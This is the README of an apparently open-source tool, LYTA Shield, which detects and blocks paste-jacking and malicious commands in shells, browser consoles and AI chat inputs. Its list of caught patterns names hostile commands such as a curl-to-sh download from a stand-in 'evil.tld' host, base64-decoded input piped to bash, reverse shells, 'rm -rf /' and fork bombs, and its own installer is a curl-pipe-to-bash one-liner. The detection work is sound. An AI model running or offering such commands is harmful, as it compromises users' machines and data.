# LYTA Shield 🛡

An all-in-one, lightweight defense against **paste-jacking**, **social-engineering attacks**, and malicious code execution across:

- 💻 **Terminal** (zsh / bash)
- 🔍 **Browser DevTools console**
- 🧠 **AI chat inputs** (ChatGPT, Claude, Gemini, etc.)

One wrong paste can compromise your entire machine. LYTA Shield intercepts the dangerous text **before it executes**.

---

## What it catches

- `echo "BASE64" | base64 -d | bash`
- `curl http://evil.tld/payload | sh`
- obfuscated `python3 -c`, `perl -e`, `ruby -e`, `node -e` payloads
- reverse shells
- destructive commands (`rm -rf /`, `mkfs`, fork bombs)
- social-engineering instructions like "copy this into your terminal"
- browser `eval()`, `document.write()`, `fetch()` to remote URLs
- `localStorage` / `sessionStorage` / `process.env` key theft
- pasted malicious code in AI chat prompts

---

## What it allows

- `ls`, `git push`, `cd`, normal `python` scripts, etc.
- Known safe installers are **downgraded to confirmation**, not blocked:
  - `https://hermes-agent.nousresearch.com/install.sh`
  - `https://ollama.com/install.sh`
  - `https://x.ai/cli/install.sh`
  - `https://sh.rustup.rs`
  - `https://brew.sh/...`

---

## Install

### Terminal guard

```bash
curl -fsSL https://raw.githubusercontent.com/Kubo-cmd/lyta-shield/main/install.sh | bash
```

Then start a new shell.

### Browser + AI chat guard

1. Install [Tampermonkey](https://www.tampermonkey.net/).
2. Install the userscript: `extensions/browser/lyta_shield_console_guard.user.js`
   - Click it in the repo, then click **Raw**.

---

## Usage

### Terminal

```bash
# Check a single command
python3 ~/.config/lyta-shield/lyta_shield.py --check "echo foo | base64 -d | bash"

# Scan your shell history
python3 ~/.config/lyta-shield/lyta_shield.py --batch ~/.zsh_history

# Bypass (only when you are sure)
LYTA_SHIELD_DISABLE=1 curl -fsSL https://example.com/install.sh | bash
```

### Browser

The userscript auto-activates on all websites. It will:
- Warn you when pasting dangerous code into AI chat inputs.
- Block `eval()` of dangerous code on the page.

---

## Exit codes

- `0` — safe
- `1` — suspicious, requires confirmation
- `2` — dangerous, blocked

---

## Architecture

```
lyta-shield/
├── src/
│   ├── lyta_shield_rules.py    # shared rule engine
│   ├── lyta_shield.py          # terminal CLI
│   └── lyta_shield_hook.sh     # zsh / bash shell hook
├── extensions/
│   ├── browser/                # Tampermonkey userscript
│   └── ai-chat/                # AI chat input guard (part of userscript)
├── tests/
├── install.sh
├── README.md
└── LICENSE
```

All surfaces share the same rule engine. Terminal uses the Python backend. Browser uses a mirror of the rules in JavaScript.

---

## Tests

```bash
cd lyta-shield
python3 tests/test_lyta_shield_rules.py
```

---

## Supported shells

- `zsh` (via `preexec` hook)
- `bash` (via `DEBUG` trap)

---

## License

MIT — Copyright (c) 2026 Kubo-cmd

---

## Credits

Built by LYTA.EXE after a real paste-jacking incident. Share it. Guard your friends.
